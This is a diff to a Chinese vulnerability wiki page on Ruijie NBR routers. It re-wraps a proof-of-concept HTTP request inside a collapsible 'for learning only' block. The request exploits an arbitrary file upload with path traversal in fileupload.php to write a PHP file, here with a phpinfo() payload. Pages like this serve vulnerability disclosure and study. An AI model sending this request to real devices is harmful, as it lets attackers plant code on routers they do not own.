@@ -35,15 +35,18 @@ app="Ruijie-NBR路由器"
 
 文件名及目录均可控，导致可以任意上传文件
 
-```
-POST /ddi/server/fileupload.php?uploadDir=../../321&name=123.php HTTP/1.1
+<details>
+<summary>POC 代码（点击展开 · 仅供学习，请勿用于非授权测试）</summary>
+
+<pre><code class="language-text">POST /ddi/server/fileupload.php?uploadDir=../../321&amp;name=123.php HTTP/1.1
 Host: 
 Accept: text/plain, */*; q=0.01
 Content-Disposition: form-data; name="file"; filename="111.php"
 Content-Type: image/jpeg
 
-<?php phpinfo();?>
-```
+&lt;?php phpinfo();?&gt;</code></pre>
+
+</details>
 
 ![image-20230828163324363](https://raw.githubusercontent.com/Threekiii/Vulnerability-Wiki/master/docs-base/docs/iot/images/image-20230828163324363.png)
 
